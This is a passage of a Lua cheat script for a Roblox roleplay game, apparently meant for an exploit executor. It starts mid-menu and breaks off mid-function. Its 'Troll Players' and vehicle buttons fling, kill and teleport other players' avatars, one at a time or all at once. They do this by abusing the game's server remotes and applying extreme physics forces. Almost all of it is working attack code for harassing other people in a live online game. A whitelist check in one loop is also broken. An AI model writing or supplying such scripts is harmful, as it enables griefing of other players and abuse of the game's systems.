	v126:AddButton({
		Name = "Click Fling Portas [Beta]",
		Description = "Para Usar, Recomendo chegar perto de outras portas, apos ela ir até você, clique no jogador que deseja flingar",
		Callback = function()
			local Players5 = game:GetService("Players")
			local Workspace2 = game:GetService("Workspace")
			local RunService3 = game:GetService("RunService")
			local UserInputService = game:GetService("UserInputService")
			local LocalPlayer5 = Players5.LocalPlayer
			local HumanoidRootPart2 = (LocalPlayer5.Character or LocalPlayer5.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart")
			local Part = Instance.new("Part")

			Part.Size = Vector3.new(100000, 100000, 100000)
			Part.Transparency = 1
			Part.Anchored = true
			Part.CanCollide = false
			Part.Name = "BlackHoleTarget"
			Part.Parent = Workspace2

			local Attachment = Instance.new("Attachment")

			Attachment.Name = "Luscaa_BlackHoleAttachment"
			Attachment.Parent = Part
			RunService3.Heartbeat:Connect(function()
				Part.CFrame = HumanoidRootPart2.CFrame
			end)

			local t33 = {}

			local function v787(p78)
				if not p78:IsA("BasePart") or p78.Anchored or not string.find(p78.Name, "Door") then
					return
				end

				if p78:FindFirstChild("Luscaa_Attached") then
					return
				end

				p78.CanCollide = false

				for _, child in ipairs(p78:GetChildren()) do
					if child:IsA("AlignPosition") or child:IsA("Torque") or child:IsA("Attachment") then
						child:Destroy()
					end
				end

				Instance.new("BoolValue", p78).Name = "Luscaa_Attached"

				local Attachment2 = Instance.new("Attachment", p78)
				local AlignPosition = Instance.new("AlignPosition", p78)

				AlignPosition.Attachment0 = Attachment2
				AlignPosition.Attachment1 = Attachment
				AlignPosition.MaxForce = 1e20
				AlignPosition.MaxVelocity = math.huge
				AlignPosition.Responsiveness = 99999

				local Torque = Instance.new("Torque", p78)

				Torque.Attachment0 = Attachment2
				Torque.RelativeTo = Enum.ActuatorRelativeTo.World
				Torque.Torque = Vector3.new(math.random(-1000000, 1000000) * 10000, math.random(-1000000, 1000000) * 10000, math.random(-1000000, 1000000) * 10000)
				table.insert(t33, {
					Part = p78,
					Align = AlignPosition
				})
			end

			for _, descendant in ipairs(Workspace2:GetDescendants()) do
				if descendant:IsA("BasePart") and string.find(descendant.Name, "Door") then
					v787(descendant)
				end
			end

			Workspace2.DescendantAdded:Connect(function(descendant)
				if descendant:IsA("BasePart") and string.find(descendant.Name, "Door") then
					v787(descendant)
				end
			end)

			local function v795(p79)
				local Character2 = p79.Character

				if not Character2 then
					return
				end

				local HumanoidRootPart3 = Character2:FindFirstChild("HumanoidRootPart")

				if not HumanoidRootPart3 then
					return
				end

				local ChaosHub_TargetAttachment = HumanoidRootPart3:FindFirstChild("ChaosHub_TargetAttachment")

				if not ChaosHub_TargetAttachment then
					ChaosHub_TargetAttachment = Instance.new("Attachment", HumanoidRootPart3)
					ChaosHub_TargetAttachment.Name = "ChaosHub_TargetAttachment"
				end

				for _, v1 in ipairs(t33) do
					if v1.Align then
						v1.Align.Attachment1 = ChaosHub_TargetAttachment
					end
				end

				local now = tick()

				while tick() - now < 5 do
					if HumanoidRootPart3.Velocity.Magnitude >= 20 then
						break
					else
						RunService3.Heartbeat:Wait()
					end
				end

				for _, v1 in ipairs(t33) do
					if v1.Align then
						v1.Align.Attachment1 = Attachment
					end
				end
			end

			UserInputService.TouchTap:Connect(function(p80, p81)
				if p81 then
					return
				end

				local v804 = p80[1]
				local v805 = Workspace2.CurrentCamera:ScreenPointToRay(v804.X, v804.Y)
				local hit = Workspace2:Raycast(v805.Origin, v805.Direction * 1000)

				if hit and hit.Instance then
					local playerFromCharacter = Players5:GetPlayerFromCharacter(hit.Instance:FindFirstAncestorOfClass("Model"))

					if playerFromCharacter and playerFromCharacter ~= LocalPlayer5 then
						v795(playerFromCharacter)
					end
				end
			end)
		end
	})
	v126:AddButton({
		Name = "Click Fling Couch (Tool)",
		Callback = function()
			local Players5 = game:GetService("Players")
			local ReplicatedStorage3 = game:GetService("ReplicatedStorage")
			local UserInputService = game:GetService("UserInputService")
			local LocalPlayer5 = Players5.LocalPlayer
			local u812 = true
			local u813 = false
			local Backpack = LocalPlayer5:WaitForChild("Backpack")
			local v815

			if not Backpack:FindFirstChild("Click Fling Couch") then
				local Tool

				if LocalPlayer5.Character then
					if not LocalPlayer5.Character:FindFirstChild("Click Fling Couch") then
						Tool = Instance.new("Tool")
						Tool.Name = "Click Fling Couch"
						Tool.RequiresHandle = false
						Tool.CanBeDropped = false
						Tool.Equipped:Connect(function()
							u813 = true
						end)
						Tool.Unequipped:Connect(function()
							u813 = false
						end)
						Tool.Parent = Backpack
					end
				else
					Tool = Instance.new("Tool")
					Tool.Name = "Click Fling Couch"
					Tool.RequiresHandle = false
					Tool.CanBeDropped = false
					Tool.Equipped:Connect(function()
						u813 = true
					end)
					Tool.Unequipped:Connect(function()
						u813 = false
					end)
					Tool.Parent = Backpack
					v815 = function(p82)
						if not u813 then
							return
						end

						if p82 and p82.Character then
							if p82 ~= LocalPlayer5 then
								local u817 = true
								local HumanoidRootPart2 = LocalPlayer5.Character and LocalPlayer5.Character:FindFirstChild("HumanoidRootPart")
								local HumanoidRootPart3 = p82.Character and p82.Character:FindFirstChild("HumanoidRootPart")

								if not HumanoidRootPart2 or not HumanoidRootPart3 then
									return
								end

								local Character2 = LocalPlayer5.Character
								local Humanoid2 = Character2:FindFirstChildOfClass("Humanoid")
								local CFrame_ = HumanoidRootPart2.CFrame

								ReplicatedStorage3:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")
								task.wait(0.2)
								ReplicatedStorage3.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
								task.wait(0.3)

								local Couch = LocalPlayer5.Backpack:FindFirstChild("Couch")

								if Couch then
									Couch.Parent = Character2
								end

								task.wait(0.1)
								game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.F, false, game)
								task.wait(0.25)
								workspace.FallenPartsDestroyHeight = (0/0)

								local BodyVelocity = Instance.new("BodyVelocity")

								BodyVelocity.Name = "ForcaJogada"
								BodyVelocity.Velocity = Vector3.new(900000000, 900000000, 900000000)
								BodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
								BodyVelocity.Parent = HumanoidRootPart2
								Humanoid2:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
								Humanoid2.PlatformStand = false
								workspace.CurrentCamera.CameraSubject = p82.Character:FindFirstChild("Head") or HumanoidRootPart3
								task.spawn(function()
									local n19 = 0
									local t34 = { HumanoidRootPart2 }

									while u817 and p82 and p82.Character do
										if p82.Character:FindFirstChildOfClass("Humanoid") then
											if not p82.Character:FindFirstChildOfClass("Humanoid").Sit then
												n19 += 50

												for _ in ipairs(t34) do
													local HumanoidRootPart4 = p82.Character.HumanoidRootPart

													HumanoidRootPart2.CFrame = CFrame.new(HumanoidRootPart4.Position + HumanoidRootPart4.Velocity / 1.5) * CFrame.Angles(math.rad(n19), 0, 0)
												end

												HumanoidRootPart2.Velocity = Vector3.new(900000000, 900000000, 900000000)
												HumanoidRootPart2.RotVelocity = Vector3.new(900000000, 900000000, 900000000)
												task.wait()

												continue
											end
										end

										break
									end

									u817 = false
									BodyVelocity:Destroy()
									Humanoid2:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
									Humanoid2.PlatformStand = false
									HumanoidRootPart2.CFrame = CFrame_
									workspace.CurrentCamera.CameraSubject = Humanoid2

									for _, descendant in pairs(Character2:GetDescendants()) do
										if descendant:IsA("BasePart") then
											descendant.Velocity = Vector3.zero
											descendant.RotVelocity = Vector3.zero
										end
									end

									Humanoid2:UnequipTools()
									ReplicatedStorage3.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
								end)

								while u817 do
									task.wait()
								end

								return
							end
						end
					end
					UserInputService.TouchTap:Connect(function(p83, p84)
						if p84 or not u812 or not u813 then
							return
						end

						local v831 = p83[1]
						local v832 = workspace.CurrentCamera:ScreenPointToRay(v831.X, v831.Y)
						local hit = workspace:Raycast(v832.Origin, v832.Direction * 1000)

						if hit and hit.Instance then
							local playerFromCharacter = Players5:GetPlayerFromCharacter(hit.Instance:FindFirstAncestorOfClass("Model"))

							if playerFromCharacter and playerFromCharacter ~= LocalPlayer5 then
								u812 = false
								v815(playerFromCharacter)
								task.delay(2, function()
									u812 = true
								end)
							end
						end
					end)

					return
				end
			end

			v815 = function(p85)
				if not u813 then
					return
				end

				if p85 and p85.Character then
					if p85 ~= LocalPlayer5 then
						local u835 = true
						local HumanoidRootPart2 = LocalPlayer5.Character and LocalPlayer5.Character:FindFirstChild("HumanoidRootPart")
						local HumanoidRootPart3 = p85.Character and p85.Character:FindFirstChild("HumanoidRootPart")

						if not HumanoidRootPart2 or not HumanoidRootPart3 then
							return
						end

						local Character2 = LocalPlayer5.Character
						local Humanoid2 = Character2:FindFirstChildOfClass("Humanoid")
						local CFrame_ = HumanoidRootPart2.CFrame

						ReplicatedStorage3:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")
						task.wait(0.2)
						ReplicatedStorage3.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
						task.wait(0.3)

						local Couch = LocalPlayer5.Backpack:FindFirstChild("Couch")

						if Couch then
							Couch.Parent = Character2
						end

						task.wait(0.1)
						game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.F, false, game)
						task.wait(0.25)
						workspace.FallenPartsDestroyHeight = (0/0)

						local BodyVelocity = Instance.new("BodyVelocity")

						BodyVelocity.Name = "ForcaJogada"
						BodyVelocity.Velocity = Vector3.new(900000000, 900000000, 900000000)
						BodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
						BodyVelocity.Parent = HumanoidRootPart2
						Humanoid2:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
						Humanoid2.PlatformStand = false
						workspace.CurrentCamera.CameraSubject = p85.Character:FindFirstChild("Head") or HumanoidRootPart3
						task.spawn(function()
							local n20 = 0
							local t35 = { HumanoidRootPart2 }

							while u835 and p85 and p85.Character do
								if p85.Character:FindFirstChildOfClass("Humanoid") then
									if not p85.Character:FindFirstChildOfClass("Humanoid").Sit then
										n20 += 50

										for _ in ipairs(t35) do
											local HumanoidRootPart4 = p85.Character.HumanoidRootPart

											HumanoidRootPart2.CFrame = CFrame.new(HumanoidRootPart4.Position + HumanoidRootPart4.Velocity / 1.5) * CFrame.Angles(math.rad(n20), 0, 0)
										end

										HumanoidRootPart2.Velocity = Vector3.new(900000000, 900000000, 900000000)
										HumanoidRootPart2.RotVelocity = Vector3.new(900000000, 900000000, 900000000)
										task.wait()

										continue
									end
								end

								break
							end

							u835 = false
							BodyVelocity:Destroy()
							Humanoid2:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
							Humanoid2.PlatformStand = false
							HumanoidRootPart2.CFrame = CFrame_
							workspace.CurrentCamera.CameraSubject = Humanoid2

							for _, descendant in pairs(Character2:GetDescendants()) do
								if descendant:IsA("BasePart") then
									descendant.Velocity = Vector3.zero
									descendant.RotVelocity = Vector3.zero
								end
							end

							Humanoid2:UnequipTools()
							ReplicatedStorage3.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
						end)

						while u835 do
							task.wait()
						end

						return
					end
				end
			end
			UserInputService.TouchTap:Connect(function(p86, p87)
				if p87 or not u812 or not u813 then
					return
				end

				local v849 = p86[1]
				local v850 = workspace.CurrentCamera:ScreenPointToRay(v849.X, v849.Y)
				local hit = workspace:Raycast(v850.Origin, v850.Direction * 1000)

				if hit and hit.Instance then
					local playerFromCharacter = Players5:GetPlayerFromCharacter(hit.Instance:FindFirstAncestorOfClass("Model"))

					if playerFromCharacter and playerFromCharacter ~= LocalPlayer5 then
						u812 = false
						v815(playerFromCharacter)
						task.delay(2, function()
							u812 = true
						end)
					end
				end
			end)
		end
	})
	v126:AddButton({
		Name = "Click Fling Ball (Tool)",
		Callback = function()
			local Players5 = game:GetService("Players")

			game:GetService("ReplicatedStorage")

			local Workspace2 = game:GetService("Workspace")
			local UserInputService = game:GetService("UserInputService")
			local CurrentCamera = Workspace2.CurrentCamera
			local LocalPlayer5 = Players5.LocalPlayer
			local u858 = false
			local Backpack = LocalPlayer5:WaitForChild("Backpack")

			if not Backpack:FindFirstChild("Click Fling Ball") then
				local Tool = Instance.new("Tool")

				Tool.Name = "Click Fling Ball"
				Tool.RequiresHandle = false
				Tool.CanBeDropped = false
				Tool.Equipped:Connect(function()
					u858 = true
				end)
				Tool.Unequipped:Connect(function()
					u858 = false
				end)
				Tool.Parent = Backpack
			end

			UserInputService.TouchTap:Connect(function(p88, p89)
				if not u858 or p89 then
					return
				end

				local v861 = p88[1]
				local v862 = CurrentCamera:ScreenPointToRay(v861.X, v861.Y)
				local hit = Workspace2:Raycast(v862.Origin, v862.Direction * 1000)

				if hit and hit.Instance then
					local Model = hit.Instance:FindFirstAncestorOfClass("Model")
					local playerFromCharacter = Players5:GetPlayerFromCharacter(Model)

					if playerFromCharacter and playerFromCharacter ~= LocalPlayer5 then
						v615(playerFromCharacter)
					end
				end
			end)
		end
	})
	v126:AddButton({
		Name = "Click Kill Couch (Tool)",
		Callback = function()
			local Players5 = game:GetService("Players")
			local ReplicatedStorage3 = game:GetService("ReplicatedStorage")
			local RunService3 = game:GetService("RunService")
			local Workspace2 = game:GetService("Workspace")
			local UserInputService = game:GetService("UserInputService")
			local LocalPlayer5 = Players5.LocalPlayer
			local CurrentCamera = Workspace2.CurrentCamera
			local u873 = false
			local Name
			local connection
			local u876 = false
			local Part
			local CFrame_
			local HumanoidRootPart2
			local Backpack = LocalPlayer5:WaitForChild("Backpack")

			if not Backpack:FindFirstChild("Click Kill Couch") then
				local Tool = Instance.new("Tool")

				Tool.Name = "Click Kill Couch"
				Tool.RequiresHandle = false
				Tool.CanBeDropped = false
				Tool.Equipped:Connect(function()
					u873 = true
				end)
				Tool.Unequipped:Connect(function()
					u873 = false
					Name = nil
					limparSofa()
				end)
				Tool.Parent = Backpack
			end

			limparSofa = function()
				if connection then
					connection:Disconnect()
					connection = nil
				end

				if u876 then
					local Character2 = LocalPlayer5.Character

					if Character2 then
						local Couch = Character2:FindFirstChild("Couch")

						if Couch then
							Couch.Parent = LocalPlayer5.Backpack
							u876 = false
						end
					end
				end

				if Part then
					Part:Destroy()
					Part = nil
				end

				if getgenv().AntiSit then
					getgenv().AntiSit:Set(false)
				end

				local Humanoid2 = LocalPlayer5.Character and LocalPlayer5.Character:FindFirstChildOfClass("Humanoid")

				if Humanoid2 then
					Humanoid2:SetStateEnabled(Enum.HumanoidStateType.Physics, true)
					Humanoid2:ChangeState(Enum.HumanoidStateType.GettingUp)
				end

				if CFrame_ and HumanoidRootPart2 then
					HumanoidRootPart2.CFrame = CFrame_
					CFrame_ = nil
				end
			end
			pegarSofa = function()
				local Character2 = LocalPlayer5.Character

				if not Character2 then
					return
				end

				local Backpack2 = LocalPlayer5.Backpack

				if not Backpack2:FindFirstChild("Couch") then
					if not Character2:FindFirstChild("Couch") then
						ReplicatedStorage3.RE["1Too1l"]:InvokeServer(unpack({
							"PickingTools",
							"Couch"
						}))
						task.wait(0.1)
					end
				end

				local Couch = Backpack2:FindFirstChild("Couch") or Character2:FindFirstChild("Couch")

				if Couch then
					Couch.Parent = Character2
					u876 = true
				end
			end
			posAleatoriaAbaixo = function(p90)
				local HumanoidRootPart3 = p90:FindFirstChild("HumanoidRootPart")

				if HumanoidRootPart3 then
					return HumanoidRootPart3.Position + Vector3.new(math.random(-2, 2), -5.1, math.random(-2, 2))
				end

				return Vector3.new()
			end
			tpAbaixo = function(p91)
				if p91 then
					if p91.Character then
						if p91.Character:FindFirstChild("HumanoidRootPart") then
							local Character2 = LocalPlayer5.Character
							local HumanoidRootPart3 = Character2 and Character2:FindFirstChild("HumanoidRootPart")
							local Humanoid2 = Character2 and Character2:FindFirstChildOfClass("Humanoid")

							if not HumanoidRootPart3 or not Humanoid2 then
								return
							end

							Humanoid2:SetStateEnabled(Enum.HumanoidStateType.Physics, false)

							if not Part then
								Part = Instance.new("Part")
								Part.Size = Vector3.new(10, 1, 10)
								Part.Anchored = true
								Part.CanCollide = true
								Part.Transparency = 0.5
								Part.Parent = Workspace2
							end

							local v892 = posAleatoriaAbaixo(p91.Character)

							Part.Position = v892
							HumanoidRootPart3.CFrame = CFrame.new(v892)
							Humanoid2:SetStateEnabled(Enum.HumanoidStateType.Physics, true)

							return
						end
					end
				end
			end
			arremessarComSofa = function(p92)
				if not p92 then
					return
				end

				Name = p92.Name

				local Character2 = LocalPlayer5.Character

				if not Character2 then
					return
				end

				CFrame_ = Character2:FindFirstChild("HumanoidRootPart") and Character2.HumanoidRootPart.CFrame
				HumanoidRootPart2 = Character2:FindFirstChild("HumanoidRootPart")
				pegarSofa()
				connection = RunService3.Heartbeat:Connect(function()
					local v894 = Players5:FindFirstChild(Name)

					if v894 and v894.Character then
						if v894.Character:FindFirstChild("Humanoid") then
							if getgenv().AntiSit then
								getgenv().AntiSit:Set(true)
							end

							tpAbaixo(v894)

							return
						end
					end

					limparSofa()
				end)
				task.spawn(function()
					local v895 = Players5:FindFirstChild(Name)

					while v895 and v895.Character do
						if not v895.Character:FindFirstChild("Humanoid") then
							break
						end

						task.wait(0.05)

						if v895.Character.Humanoid.SeatPart then
							local cFrame = CFrame.new(265.46, -450.83, -59.93)

							v895.Character.HumanoidRootPart.CFrame = cFrame
							LocalPlayer5.Character.HumanoidRootPart.CFrame = cFrame
							task.wait(0.4)
							limparSofa()
							task.wait(0.2)

							if CFrame_ then
								LocalPlayer5.Character.HumanoidRootPart.CFrame = CFrame_
							end

							break
						end
					end
				end)
			end
			UserInputService.TouchTap:Connect(function(p93, p94)
				if u873 then
					if not p94 then
						local v897 = p93[1]
						local v898 = CurrentCamera:ScreenPointToRay(v897.X, v897.Y)
						local hit = Workspace2:Raycast(v898.Origin, v898.Direction * 1000)

						if hit and hit.Instance then
							local Model = hit.Instance:FindFirstAncestorOfClass("Model")
							local playerFromCharacter = Players5:GetPlayerFromCharacter(Model)

							if playerFromCharacter and playerFromCharacter ~= LocalPlayer5 then
								arremessarComSofa(playerFromCharacter)
							end
						end

						return
					end
				end
			end)
		end
	})
	v126:AddSection({
		Name = "All methods"
	})
	print("Kill All Bus button created")
	print("House Ban kill All button created")
	v126:AddButton({
		Name = "Fling Boat all",
		Callback = function()
			local LocalPlayer5 = game.Players.LocalPlayer
			local Character2 = LocalPlayer5.Character
			local Humanoid2 = Character2:FindFirstChildOfClass("Humanoid")
			local HumanoidRootPart2 = Character2:FindFirstChild("HumanoidRootPart")
			local Vehicles = game.Workspace:FindFirstChild("Vehicles")
			local CFrame_ = HumanoidRootPart2.CFrame
			local n21 = 0

			if not Vehicles:FindFirstChild(LocalPlayer5.Name .. "Car") and HumanoidRootPart2 then
				HumanoidRootPart2.CFrame = CFrame.new(1754, -2, 58)
				task.wait(0.5)
				game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingBoat", "MilitaryBoatFree")
				task.wait(0.5)

				local v909 = Vehicles:FindFirstChild(LocalPlayer5.Name .. "Car")

				task.wait(0.5)

				local VehicleSeat = v909:FindFirstChild("Body") and v909.Body:FindFirstChild("VehicleSeat")

				if VehicleSeat then
					repeat
						task.wait()
						HumanoidRootPart2.CFrame = VehicleSeat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
					until Humanoid2.Sit
				end
			end

			task.wait(0.5)

			local v911 = Vehicles:FindFirstChild(LocalPlayer5.Name .. "Car")

			if v911 and not Humanoid2.Sit then
				local VehicleSeat = v911:FindFirstChild("Body") and v911.Body:FindFirstChild("VehicleSeat")

				if VehicleSeat then
					repeat
						task.wait()
						HumanoidRootPart2.CFrame = VehicleSeat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
					until Humanoid2.Sit
				end
			end

			local BodyGyro = Instance.new("BodyGyro")

			BodyGyro.Parent = v911.PrimaryPart
			BodyGyro.MaxTorque = Vector3.new(10000000, 10000000, 10000000)
			BodyGyro.P = 10000000
			BodyGyro.CFrame = v911.PrimaryPart.CFrame * CFrame.Angles(0, math.rad(90), 0)

			local function v914(p95, p96)
				n21 = 0

				local v915 = tick() + 1

				while tick() < v915 do
					n21 += 100
					task.wait()

					local function v916(p97, p98, p99)
						v911:SetPrimaryPartCFrame(CFrame.new(p97.Position) * p98 * p99)
					end

					v916(p96, CFrame.new(0, 3, 0), CFrame.Angles(math.rad(n21), 0, 0))
					v916(p96, CFrame.new(0, -1.5, 2), CFrame.Angles(math.rad(n21), 0, 0))
					v916(p96, CFrame.new(2, 1.5, 2.25), CFrame.Angles(math.rad(50), 0, 0))
					v916(p96, CFrame.new(-2.25, -1.5, 2.25), CFrame.Angles(math.rad(30), 0, 0))
					v916(p96, CFrame.new(0, 1.5, 0), CFrame.Angles(math.rad(n21), 0, 0))
					v916(p96, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(n21), 0, 0))
				end
			end

			for _, player in pairs(game.Players:GetPlayers()) do
				if player ~= LocalPlayer5 or table.find(Whitelist, target.Name) == nil then
					local Character3 = player.Character
					local Humanoid3 = Character3 and Character3:FindFirstChildOfClass("Humanoid")
					local HumanoidRootPart3 = Character3 and Character3:FindFirstChild("HumanoidRootPart")

					if Character3 and Humanoid3 and HumanoidRootPart3 then
						v914(Character3, HumanoidRootPart3, Humanoid3)
					end
				end
			end

			task.wait(0.5)
			v911:SetPrimaryPartCFrame(CFrame.new(0, 0, 0))
			task.wait(0.5)
			Humanoid2.Sit = false
			task.wait(0.5)
			HumanoidRootPart2.CFrame = CFrame_
			BodyGyro:Destroy()
		end
	})
	print("Fling Boat All button created")
	v126:AddButton({
		Name = "Auto Fling All",
		Callback = function()
			local Players5 = game:GetService("Players")
			local ReplicatedStorage3 = game:GetService("ReplicatedStorage")
			local LocalPlayer5 = Players5.LocalPlayer

			local function v925(p100)
				if not p100 or not p100.Character or p100 == LocalPlayer5 or table.find(Whitelist, p100.Name) ~= nil then
					return
				end

				local u926 = true
				local HumanoidRootPart2 = LocalPlayer5.Character and LocalPlayer5.Character:FindFirstChild("HumanoidRootPart")
				local HumanoidRootPart3 = p100.Character and p100.Character:FindFirstChild("HumanoidRootPart")

				if not HumanoidRootPart2 or not HumanoidRootPart3 then
					return
				end

				local Character2 = LocalPlayer5.Character
				local Humanoid2 = Character2:FindFirstChildOfClass("Humanoid")
				local CFrame_ = HumanoidRootPart2.CFrame

				ReplicatedStorage3:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")
				task.wait(0.2)
				ReplicatedStorage3.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
				task.wait(0.3)

				local Couch = LocalPlayer5.Backpack:FindFirstChild("Couch")

				if Couch then
					Couch.Parent = Character2
				end

				task.wait(0.1)
				game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.F, false, game)
				task.wait(0.25)
				workspace.FallenPartsDestroyHeight = (0/0)

				local BodyVelocity = Instance.new("BodyVelocity")

				BodyVelocity.Name = "FlingForce"
				BodyVelocity.Velocity = Vector3.new(900000000, 900000000, 900000000)
				BodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
				BodyVelocity.Parent = HumanoidRootPart2
				Humanoid2:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
				Humanoid2.PlatformStand = false
				workspace.CurrentCamera.CameraSubject = p100.Character:FindFirstChild("Head") or HumanoidRootPart3
				task.spawn(function()
					local n22 = 0
					local t36 = { HumanoidRootPart2 }

					while u926 and p100 and p100.Character do
						if p100.Character:FindFirstChildOfClass("Humanoid") then
							if not p100.Character:FindFirstChildOfClass("Humanoid").Sit then
								n22 += 50

								for _ in ipairs(t36) do
									local HumanoidRootPart4 = p100.Character.HumanoidRootPart

									HumanoidRootPart2.CFrame = CFrame.new(HumanoidRootPart4.Position + HumanoidRootPart4.Velocity / 1.5) * CFrame.Angles(math.rad(n22), 0, 0)
								end

								HumanoidRootPart2.Velocity = Vector3.new(900000000, 900000000, 900000000)
								HumanoidRootPart2.RotVelocity = Vector3.new(900000000, 900000000, 900000000)
								task.wait()

								continue
							end
						end

						break
					end

					u926 = false
					BodyVelocity:Destroy()
					Humanoid2:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
					Humanoid2.PlatformStand = false
					HumanoidRootPart2.CFrame = CFrame_
					workspace.CurrentCamera.CameraSubject = Humanoid2

					for _, descendant in pairs(Character2:GetDescendants()) do
						if descendant:IsA("BasePart") then
							descendant.Velocity = Vector3.zero
							descendant.RotVelocity = Vector3.zero
						end
					end

					Humanoid2:UnequipTools()
					ReplicatedStorage3.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
				end)

				while u926 do
					task.wait()
				end
			end

			for _, player in ipairs(Players5:GetPlayers()) do
				v925(player)
			end
		end
	})
	print("Kill All Couch button created")
	v126:AddButton({
		Name = "Fling Ball all",
		Callback = function()
			for _, player in pairs(Players4:GetPlayers()) do
				if player ~= game.Players.LocalPlayer and player.Character then
					v615(player)
					pcall(function()
						if player.Character.HumanoidRootPart.Velocity.Magnitude < 1000 then
							return v615(player)
						end
					end)
				end
			end
		end
	})
end)
if not ok then warn('[Troll Players] erro: ' .. tostring(err)) end
end

local CarTab = Window:MakeTab({"Vehicles", "car"})

-- ============================================
-- ============================================
-- GRAB & THROW CLOSEST CAR (2 cliques, alinhado)
-- ============================================
CarTab:AddSection({"Grab & Throw"})

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer

local grabActive = false
local grabConn = nil
local currentCar = nil
local currentMainPart = nil
local targetPart = nil

local function getClosestCar()
    local character = LocalPlayer.Character
    local hrp = character and character:FindFirstChild("HumanoidRootPart")
    if not hrp then return nil end

    local vehiclesFolder = Workspace:FindFirstChild("Vehicles")
    if not vehiclesFolder then return nil end

    local closest, shortestDistance = nil, 120
    for _, vehicle in ipairs(vehiclesFolder:GetChildren()) do
        local primary = vehicle.PrimaryPart
            or vehicle:FindFirstChild("Body", true)
            or vehicle:FindFirstChild("Chassis", true)
            or vehicle:FindFirstChildWhichIsA("BasePart")

        if primary and primary:IsA("BasePart") and not primary.Anchored then
            local distance = (hrp.Position - primary.Position).Magnitude
            if distance < shortestDistance then
                shortestDistance = distance
                closest = vehicle
            end
        end
    end
    return closest
end

local function clearGrab()
    if grabConn then
        grabConn:Disconnect()
        grabConn = nil
    end

    if currentCar then
        for _, obj in ipairs(currentCar:GetDescendants()) do
            if obj.Name == "ScarletGrabAttach"
                or obj.Name == "ScarletGrabAlign"
                or obj.Name == "ScarletGrabOrientation" then
                obj:Destroy()
            end
        end
    end

    if targetPart then
        targetPart:Destroy()
        targetPart = nil
    end

    currentCar = nil
    currentMainPart = nil
    grabActive = false
end

CarTab:AddButton({
    Name = "Grab & Throw Closest Car",
    Description = "1º clique: segura o carro. 2º clique: lança forte na direção da mira.",
    Callback = function()
        -- Segundo clique: lança o mesmo carro que já está preso.
        if grabActive then
            local launchPart = currentMainPart
            local camera = Workspace.CurrentCamera
            local direction = camera and camera.CFrame.LookVector or Vector3.new(0, 0, -1)
            if direction.Magnitude < 0.001 then
                direction = Vector3.new(0, 0, -1)
            end
            direction = direction.Unit

            clearGrab()
            -- Espera a remoção dos alinhadores antes de aplicar o impulso.
            task.wait()
            if launchPart and launchPart.Parent then
                launchPart.AssemblyAngularVelocity = Vector3.zero
                launchPart.AssemblyLinearVelocity = direction * 450
            end
            return
        end

        -- Primeiro clique: apenas pega e mantém o carro; não lança automaticamente.
        local car = getClosestCar()
        if not car then
            warn("[Scarlet Hub] Nenhum carro próximo encontrado!")
            return
        end

        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local hrp = character:WaitForChild("HumanoidRootPart")
        local mainPart = car.PrimaryPart
            or car:FindFirstChild("Body", true)
            or car:FindFirstChild("Chassis", true)
            or car:FindFirstChildWhichIsA("BasePart")

        if not mainPart or not mainPart:IsA("BasePart") or mainPart.Anchored then
            warn("[Scarlet Hub] Não foi possível pegar a parte principal do carro.")
            return
        end

        currentCar = car
        currentMainPart = mainPart
        grabActive = true

        targetPart = Instance.new("Part")
        targetPart.Name = "ScarletGrabTarget"
        targetPart.Size = Vector3.new(1, 1, 1)
        targetPart.Transparency = 1
        targetPart.Anchored = true
        targetPart.CanCollide = false
        targetPart.CanTouch = false
        targetPart.CanQuery = false
        targetPart.Parent = Workspace

        local targetAttachment = Instance.new("Attachment")
        targetAttachment.Name = "ScarletGrabTargetAttach"
        targetAttachment.Parent = targetPart

        for _, child in ipairs(mainPart:GetChildren()) do
            if child.Name == "ScarletGrabAttach"
                or child.Name == "ScarletGrabAlign"
                or child.Name == "ScarletGrabOrientation" then
                child:Destroy()
            end
        end

        local carAttachment = Instance.new("Attachment")
        carAttachment.Name = "ScarletGrabAttach"
        carAttachment.Parent = mainPart

        local align = Instance.new("AlignPosition")
        align.Name = "ScarletGrabAlign"
        align.Mode = Enum.PositionAlignmentMode.TwoAttachment
        align.Attachment0 = carAttachment
        align.Attachment1 = targetAttachment
        align.ApplyAtCenterOfMass = true
        align.RigidityEnabled = false
        align.MaxForce = 1e9
        align.MaxVelocity = 220
        align.Responsiveness = 45
        align.Parent = mainPart

        local orientation = Instance.new("AlignOrientation")
        orientation.Name = "ScarletGrabOrientation"
        orientation.Mode = Enum.OrientationAlignmentMode.OneAttachment
        orientation.Attachment0 = carAttachment
        orientation.RigidityEnabled = false
        orientation.MaxTorque = 1e9
        orientation.Responsiveness = 50
        orientation.Parent = mainPart

        grabConn = RunService.Heartbeat:Connect(function()
            if not grabActive or not hrp.Parent or not currentCar or not currentCar.Parent
